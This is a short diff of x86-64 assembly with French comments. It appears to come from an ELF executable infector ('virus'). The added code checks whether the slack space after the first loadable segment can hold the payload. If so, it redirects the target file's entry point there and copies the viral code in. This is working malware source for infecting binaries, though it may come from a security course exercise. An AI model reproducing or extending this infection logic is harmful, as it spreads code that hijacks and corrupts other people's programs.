@@ -83,7 +83,7 @@ check_file_integrity:
 	jne simple
     jmp get_file_entry
 
-	simple: 
+simple: 
     mov rdi, [r12 + fileName]
     call append_signature
     jmp close_mmap
@@ -118,11 +118,23 @@ phead_loop:
 first_pload_found:                                                                                              ; faire un check pour voir si on a la place d'écrire 
     add r13, rsi
     mov [r12 + pload], r13
+check_pload_size:
+    xor rdx, rdx
+    mov rax, [r13 + p_filesz]
+    mov rdi, [r13 + p_align]
+    div rdi
+    sub rdi, rdx
+    cmp rdi, PROG_SIZE
+    jl simple
+
+write_virus_entry:
     mov rdi, [r13 + p_vaddr]             ; met l'entry a la fin du premier pload = p_vaddr + p_memsz
     add rdi, [r13 + p_memsz]
     mov [r12 + entry], rdi
     mov rsi, [r12 + fileData]           ; écrit la nouvelle entry dans l'executable
     mov [rsi + e_entry], rdi
+
+
 copy_program:
     mov rdi, [r12 + fileData]               ; address a la fin du premier pload
     add rdi, [r13 + p_filesz]
